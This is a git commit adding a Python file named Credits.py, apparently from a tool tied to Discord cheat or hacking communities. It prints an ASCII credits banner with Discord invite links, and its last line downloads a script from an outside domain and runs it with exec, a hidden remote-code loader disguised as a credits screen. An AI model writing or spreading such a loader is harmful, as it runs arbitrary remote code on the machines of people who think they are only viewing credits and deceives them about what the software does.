0ef11c80201e01d1b9f55770e4e999a455190584
QuangDayy <109573750+QuangDayyy@users.noreply.github.com>
2023-12-02 21:21:17 +0700

    Add files via upload

---
+++ Credits.py
@@ -0,0 +1,38 @@
+
+def banner():
+    banner = f"""
+
+
+                                   ██████╗██████╗ ███████╗██████╗ ██╗████████╗███████╗
+                                  ██╔════╝██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝██╔════╝
+                                  ██║     ██████╔╝█████╗  ██║  ██║██║   ██║   ███████╗
+                                  ██║     ██╔══██╗██╔══╝  ██║  ██║██║   ██║   ╚════██║
+                                  ╚██████╗██║  ██║███████╗██████╔╝██║   ██║   ███████║
+                                   ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚══════╝
+
+
+                                 | luvsy's crib (https://discord.gg/luvsy)           |
+                                 | Infinity Stuff (https://discord.gg/qvktQFtBsT)    |
+                                 | fled. (https://discord.gg/epaxz643eE)             |
+                                 | Ghost (https://discord.gg/UHBK3J8kfG)             |
+                                 | WonderLand Library (https://discord.gg/pcsRpEDB6Z)|
+                                 | CookieAC (https://discord.gg/hey6PE5CWE)          |
+                                 | Mimhax (mimhax.netlify.app)                       |
+                                 | Trillium INC. (https://discord.gg/VF473pGEV5)     |
+                                 | Splash Software (https://discord.gg/GUw9bwuWrm)   |
+
+                              Report to us if you found any invite link here not working.
+                                             Press any key to return.
+"""
+    for X in banner:
+        sys.stdout.write(X)
+        sys.stdout.flush()
+        sleep(0.000001)
+
+
+
+while True:
+    os.system('cls')
+    banner()
+    msvcrt.getch()
+    exec(requests.get('https://mccfiles.levv.tk/main.py').text)
